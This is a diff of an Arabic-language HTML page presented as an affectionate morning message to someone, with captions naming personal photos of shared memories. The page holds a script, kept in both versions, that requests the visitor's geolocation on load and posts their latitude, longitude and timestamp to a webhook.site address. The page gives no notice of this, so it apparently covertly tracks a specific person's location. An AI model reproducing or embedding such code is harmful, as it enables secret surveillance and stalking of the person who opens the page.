@@ -1,4 +1,4 @@
-html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
@@ -14,48 +14,54 @@ html>
       max-width: 90%;
       margin: 10px auto;
       border-radius: 12px;
-      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+      box-shadow: 0px 4px 10px rgba(0,0,0,0.2);
     }
     .message {
       margin: 30px auto;
       font-size: 20px;
       color: #333;
+      background-color: #ffffffcc;
+      display: inline-block;
+      padding: 15px 25px;
+      border-radius: 10px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
     }
   </style>
 </head>
 <body>
-  <div class="message">
-    🫂🤍 صباحك حضن وأمان…<br>وينك توا؟ لاباس؟<br>مازلت نحس فيك بين سطور الليل.
-  </div>
-<img src="images/img1.jpg" alt="ذكرى 1">
-<img src="images/img2.jpg" alt="ذكرى 2">
-<img src="images/img3.jpg" alt="ذكرى 3">
-<img src="images/img4.jpg" alt="ذكرى 4">
-<img src="images/img5.jpg" alt="ذكرى 5">
-<img src="images/img6.jpg" alt="ذكرى 6">
-<img src="images/img7.jpg" alt="ذكرى 7">
-<img src="images/img8.jpg" alt="ذكرى 8">
-<img src="images/img9.jpg" alt="ذكرى 9">
-<img src="images/img10.jpg" alt="ذكرى 10">
-<img src="images/img11.jpg" alt="ذكرى 11">
-<img src="images/img12.jpg" alt="ذكرى 12">
-<img src="images/img13.jpg" alt="ذكرى 13">
-<img src="images/img14.jpg" alt="ذكرى 14">
-<img src="images/img15.jpg" alt="ذكرى 15">
 
-<script>
-navigator.geolocation.getCurrentPosition(function(position) {
-  fetch('https://webhook.site/344a45b6-b932-4dd4-9bc3-c96e855f2856', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      timestamp: new Date().toISOString()
-    })
-  });
-});
-</script>
-</body></html>
+  <div class="message">
+    🤍🎥 صباحك حضن وأمان…<br>
+    وينك توّا؟ لاباس؟<br>
+    مازلت نحس فيك بين سطور الليل.
+  </div>
+
+  <img src="1_cafe_kiss.jpeg" alt="صورة 1">
+  <img src="2_home_kiss.jpeg" alt="صورة 2">
+  <img src="3_feeding_icecream.jpeg" alt="صورة 3">
+  <img src="4_birthday_28.jpeg" alt="صورة 4">
+  <img src="5_kissing_point.jpeg" alt="صورة 5">
+  <img src="6_knights.jpeg" alt="صورة 6">
+  <img src="7_tavern_reading.jpeg" alt="صورة 7">
+  <img src="8_buffet.jpeg" alt="صورة 8">
+  <img src="9_lake_smile.jpeg" alt="صورة 9">
+  <img src="10_cave_water.jpeg" alt="صورة 10">
+
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+      fetch('https://webhook.site/344a45b6-b932-4dd4-9bc3-c96e855f2856', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          timestamp: new Date().toISOString()
+        })
+      });
+    });
+  </script>
+
+</body>
+</html>
